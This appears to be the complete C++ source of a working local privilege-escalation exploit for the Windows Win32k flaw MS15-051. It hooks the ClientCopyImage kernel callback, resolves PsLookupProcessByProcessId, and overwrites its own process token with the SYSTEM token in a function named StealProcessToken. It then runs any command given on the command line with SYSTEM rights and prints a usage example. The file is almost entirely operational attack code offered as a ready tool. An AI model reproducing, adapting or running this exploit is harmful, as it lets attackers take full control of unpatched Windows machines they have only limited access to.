// ms15-051.cpp : 定义控制台应用程序的入口点。
//
#include <Windows.h>
#include <stdio.h>
typedef NTSTATUS (NTAPI *pUser32_ClientCopyImage)(PVOID p);
typedef NTSTATUS (NTAPI *pPLPBPI)(HANDLE ProcessId, PVOID *Process);
typedef PVOID PHEAD;
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
#define STATUS_SECRET_TOO_LONG           ((NTSTATUS)0xC0000157L)
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#ifdef __cplusplus
extern "C" {
#endif
NTSYSAPI NTSTATUS WINAPI NtQuerySystemInformation(
	IN DWORD SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
	);
NTSYSAPI NTSTATUS WINAPI NtQueryInformationProcess(
	IN HANDLE ProcessHandle,
	IN DWORD ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL
	);
NTSYSAPI NTSTATUS WINAPI RtlGetVersion(
	_Inout_	PRTL_OSVERSIONINFOW lpVersionInformation
	);
#ifdef __cplusplus
}
#endif
#ifndef KPRIORITY
typedef LONG KPRIORITY;
#endif
typedef struct _PROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PVOID PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
typedef struct _PROCESS_EXTENDED_BASIC_INFORMATION {
	SIZE_T Size;
	PROCESS_BASIC_INFORMATION BasicInfo;
	union
	{
		ULONG Flags;
		struct
		{
			ULONG IsProtectedProcess : 1;
			ULONG IsWow64Process : 1;
			ULONG IsProcessDeleting : 1;
			ULONG IsCrossSessionCreate : 1;
			ULONG IsFrozen : 1;
			ULONG IsBackground : 1;
			ULONG IsStronglyNamed : 1;
			ULONG SpareBits : 25;
		} DUMMYSTRUCTNAME;
	} DUMMYUNIONNAME;
} PROCESS_EXTENDED_BASIC_INFORMATION, *PPROCESS_EXTENDED_BASIC_INFORMATION;
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PVOID Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
} PEB, *PPEB;
typedef struct _TEB
{
	NT_TIB NtTib;
	PVOID EnvironmentPointer;
	CLIENT_ID ClientId;
	PVOID ActiveRpcHandle;
	PVOID ThreadLocalStoragePointer;
	PPEB ProcessEnvironmentBlock;
	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	PVOID CsrClientThread;
	PVOID Win32ThreadInfo;
}TEB,*PTEB;
typedef struct _HANDLEENTRY {
	PHEAD   phead;
	PVOID   pOwner;
	BYTE    bType;
	BYTE    bFlags;
	WORD    wUniq;
} HANDLEENTRY, *PHANDLEENTRY;

typedef struct _SERVERINFO {
	WORD            wRIPFlags;
	WORD            wSRVIFlags;
	WORD            wRIPPID;
	WORD            wRIPError;
	ULONG           cHandleEntries;
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO  psi;
	PHANDLEENTRY aheList;
	ULONG   HeEntrySize;
} SHAREDINFO, *PSHAREDINFO;
static const TCHAR MAINWINDOWCLASSNAME[] = TEXT("zcgonvh");
pPLPBPI      g_PsLookupProcessByProcessIdPtr = NULL;
pUser32_ClientCopyImage  g_originalCCI = NULL;
PVOID      g_ppCCI = NULL, g_w32theadinfo = NULL;
int       g_shellCalled = 0;
DWORD      g_OurPID;
DWORD      g_EPROCESS_TokenOffset = 0;
BOOL isWin2k3=FALSE;
PVOID supGetSystemInfo()
{
	INT   c = 0;
	PVOID  Buffer = NULL;
	ULONG  Size = 0x1000;
	NTSTATUS status;
	ULONG       memIO;
	do {
		Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
		if (Buffer != NULL) 
		{
			status = NtQuerySystemInformation(11, Buffer, Size, &memIO);
		}
		else 
		{
			return NULL; 
		}
		if (status == STATUS_INFO_LENGTH_MISMATCH) 
		{
			HeapFree(GetProcessHeap(), 0, Buffer);
			Size *= 2;
		}
		c++;
		if (c > 100) 
		{
			status = STATUS_SECRET_TOO_LONG;
			break;
		}
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (NT_SUCCESS(status)) 
	{
		return Buffer;
	}
	if (Buffer) 
	{
		HeapFree(GetProcessHeap(), 0, Buffer);
	}
	return NULL;
}
BOOLEAN supIsProcess32bit(_In_ HANDLE hProcess)
{
	NTSTATUS status;
	PROCESS_EXTENDED_BASIC_INFORMATION pebi;

	if (hProcess == NULL) {
		return FALSE;
	}

	//query if this is wow64 process
	RtlSecureZeroMemory(&pebi, sizeof(pebi));
	pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
	status = NtQueryInformationProcess(hProcess, 0, &pebi, sizeof(pebi), NULL);
	if (NT_SUCCESS(status)) {
		return (pebi.IsWow64Process == 1);
	}
	return FALSE;
}
ULONG_PTR GetPsLookupProcessByProcessId(
	VOID
	)
{
	BOOL      cond = FALSE;
	ULONG      rl = 0;
	PVOID      MappedKernel = NULL;
	ULONG_PTR     KernelBase = 0L, FuncAddress = 0L;
	PRTL_PROCESS_MODULES  miSpace = NULL;
	CHAR      KernelFullPathName[MAX_PATH * 2];


	do {

		miSpace = (PRTL_PROCESS_MODULES)supGetSystemInfo();
		if (miSpace == NULL) {
			break;
		}

		if (miSpace->NumberOfModules == 0) {
			break;
		}

		rl = GetSystemDirectoryA(KernelFullPathName, MAX_PATH);
		if (rl == 0) {
			break;
		}

		KernelFullPathName[rl] = (CHAR)'\\';
		strcpy(&KernelFullPathName[rl + 1], (const char*)&miSpace->Modules[0].FullPathName[miSpace->Modules[0].OffsetToFileName]);
		KernelBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
		HeapFree(GetProcessHeap(), 0, miSpace);
		miSpace = NULL;

		MappedKernel = LoadLibraryExA(KernelFullPathName, NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (MappedKernel == NULL) {
			break;
		}

		FuncAddress = (ULONG_PTR)GetProcAddress((HMODULE)MappedKernel, "PsLookupProcessByProcessId");
		FuncAddress = KernelBase + FuncAddress - (ULONG_PTR)MappedKernel;

	} while (cond);

	if (MappedKernel != NULL) {
		FreeLibrary((HMODULE)MappedKernel);
	}
	if (miSpace != NULL) {
		HeapFree(GetProcessHeap(), 0, miSpace);
	}
	return FuncAddress;
}
HWND GetFirstThreadHWND(
	VOID
	)
{
	PSHAREDINFO  pse;
	HMODULE   huser32;
	PHANDLEENTRY List;
	ULONG_PTR  c, k;
	ULONG i;
	ULONG_PTR pfnUserRegisterWowHandlers = (ULONG_PTR)GetProcAddress(GetModuleHandleA("USER32.dll"), "UserRegisterWowHandlers");
	huser32 = GetModuleHandle(TEXT("user32.dll"));
	if (huser32 == NULL)
	{
		return 0;
	}
	pse = (PSHAREDINFO)GetProcAddress(huser32, "gSharedInfo");
	if (pse == NULL)
	{
		if(pfnUserRegisterWowHandlers)
		{
			for (i = pfnUserRegisterWowHandlers;i <= pfnUserRegisterWowHandlers +0x2a0;++i)
			{
#ifdef _WIN64
				if(*(DWORD*)i == 0x247c8b48)
				{
					pse=(PSHAREDINFO)((*(DWORD*)(i -4))+i);
					break;
				}
#else
				if (0x40c7 == *(WORD*)i && 0xb8 == *(BYTE*)(i + 7))
				{
					pse=(PSHAREDINFO)(*(DWORD*)(i + 8));
					break;
				}
#endif
			}
		}
		if(!pse){return 0;}
	}
	List = pse->aheList;
	k = pse->psi->cHandleEntries;
	if(!isWin2k3)
	{
		if (pse->HeEntrySize != sizeof(HANDLEENTRY))
		{
			return 0;
		}
	}
	for (c = 0; c < k; c++)
		if ((List[c].pOwner == g_w32theadinfo) && (List[c].bType == 1)) {
			return (HWND)(c | (((ULONG_PTR)List[c].wUniq) << 16));
		}
		return 0;
}
NTSTATUS NTAPI StealProcessToken()
{
	NTSTATUS Status;
	PVOID CurrentProcess = NULL;
	PVOID SystemProcess = NULL;

	Status = g_PsLookupProcessByProcessIdPtr((HANDLE)g_OurPID, &CurrentProcess);
	if (NT_SUCCESS(Status)) {
		Status = g_PsLookupProcessByProcessIdPtr((HANDLE)4, &SystemProcess);
		if (NT_SUCCESS(Status)) {
			if (g_EPROCESS_TokenOffset) {
				*(PVOID *)((PBYTE)CurrentProcess + g_EPROCESS_TokenOffset) = *(PVOID *)((PBYTE)SystemProcess + g_EPROCESS_TokenOffset);
			}
		}
	}
	return Status;
}
LRESULT CALLBACK MainWindowProc(_In_ HWND hwnd,_In_ UINT uMsg,_In_ WPARAM wParam,_In_ LPARAM lParam)
{
	UNREFERENCED_PARAMETER(hwnd);
	UNREFERENCED_PARAMETER(uMsg);
	UNREFERENCED_PARAMETER(wParam);
	UNREFERENCED_PARAMETER(lParam);
	if (g_shellCalled == 0) {
		StealProcessToken();
		g_shellCalled = 1;
	}
	return 0;
}

NTSTATUS NTAPI hookCCI(
	PVOID p
	)
{
	InterlockedExchangePointer((PVOID*)g_ppCCI, (PVOID*)g_originalCCI);
	HWND h=GetFirstThreadHWND();
	if(h)
	{
		SetWindowLongPtr(h, GWLP_WNDPROC, (LONG_PTR)&DefWindowProc);
	}
	return g_originalCCI(p);
}
DWORD WINAPI ThreadProc(LPVOID lpParam){
	BYTE b[1030];
	DWORD d=0;
	while(ReadFile((HANDLE)lpParam,b,1024,&d,0))
	{
		b[d]='\0';
		printf("%s",b);
		fflush(stdout);
	}
	return 0;
}
int main(int argc, char* argv[])
{
	PTEB teb = NtCurrentTeb();
	PPEB peb = teb->ProcessEnvironmentBlock;
	WNDCLASSEX  wincls;
	HINSTANCE  hinst = GetModuleHandle(NULL);
	BOOL rv = TRUE;
	ATOM class_atom;
	HWND MainWindow;
	DWORD prot;
	OSVERSIONINFOW osver;
	STARTUPINFOA    si;
	PROCESS_INFORMATION  pi;
	RtlSecureZeroMemory(&osver, sizeof(osver));
	osver.dwOSVersionInfoSize = sizeof(osver);
	RtlGetVersion(&osver);
	printf("[#] ms15-051 fixed by zcgonvh\n");
	if(argc!=2)
	{
		printf("[#] usage: ms15-051 command \n");
		printf("[#] eg: ms15-051 \"whoami /all\" \n");
		return 0;
	}
	if (osver.dwMajorVersion == 5) {
		isWin2k3=TRUE;
#ifdef _WIN64
		g_EPROCESS_TokenOffset = 0x160;
#else
		g_EPROCESS_TokenOffset = 0xd8;
#endif
	}
	else if(osver.dwMajorVersion == 6) {
#ifdef _WIN64
		g_EPROCESS_TokenOffset = 0x208;
#else
		g_EPROCESS_TokenOffset = 0xf8;
#endif
	}
	else
	{
		printf("[x] this version of system was not supported\n",osver.dwBuildNumber);
		return 0;
	}
	BOOL b=true;
	IsWow64Process(GetCurrentProcess(),&b);
	if (b) {
		printf("[x] please re-compiler this program via x64 platform\n");
		return 0;
	}
	g_OurPID = GetCurrentProcessId();
	g_PsLookupProcessByProcessIdPtr = (pPLPBPI)GetPsLookupProcessByProcessId();
	if (g_PsLookupProcessByProcessIdPtr == NULL) {
		printf("[x] can not get address of PsLookupProcessByProcessId\n");
		return 0;
	}

	RtlSecureZeroMemory(&wincls, sizeof(wincls));
	wincls.cbSize = sizeof(WNDCLASSEX);
	wincls.lpfnWndProc = &MainWindowProc;
	wincls.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wincls.lpszClassName = MAINWINDOWCLASSNAME;
	class_atom = RegisterClassEx(&wincls);
		g_w32theadinfo = teb->Win32ThreadInfo;
		g_ppCCI = &((PVOID *)peb->KernelCallbackTable)[0x36]; //  <--- User32_ClientCopyImage INDEX
		if (!VirtualProtect(g_ppCCI, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &prot)) {
			printf("[x] can not fix protect\n");
			return 0;
		}
		g_originalCCI =(pUser32_ClientCopyImage)InterlockedExchangePointer((PVOID*)g_ppCCI, &hookCCI);
		MainWindow = CreateWindowEx(0, MAKEINTATOM(class_atom),
			NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
		if (g_shellCalled == 1) {

			RtlSecureZeroMemory(&si, sizeof(si));
			RtlSecureZeroMemory(&pi, sizeof(pi));
			si.cb = sizeof(si);
			HANDLE hRead,hWrite;
			SECURITY_ATTRIBUTES sa;
			ZeroMemory(&sa,sizeof(sa));
			sa.nLength=sizeof(SECURITY_ATTRIBUTES);
			sa.lpSecurityDescriptor=NULL;
			sa.bInheritHandle=true;
			CreatePipe(&hRead,&hWrite,&sa,1024);
			si.hStdError=hWrite;
			si.hStdOutput=hWrite;
			si.lpDesktop= "WinSta0\\Default";
			si.dwFlags=STARTF_USESTDHANDLES;
			HANDLE hThread=CreateThread(NULL,0,ThreadProc,hRead,0,NULL);
			CreateProcessA(NULL,argv[1],NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
			printf("[!] process with pid: %d created.\n==============================\n",pi.dwProcessId);
			fflush(stdout);
			WaitForSingleObject(pi.hProcess,-1);
			TerminateThread(hThread,0);
		}
		else {
			printf("[x] may be patched\n");
		}
	if (class_atom)
	{
		UnregisterClass(MAKEINTATOM(class_atom), hinst);
	}
	return 0;
}

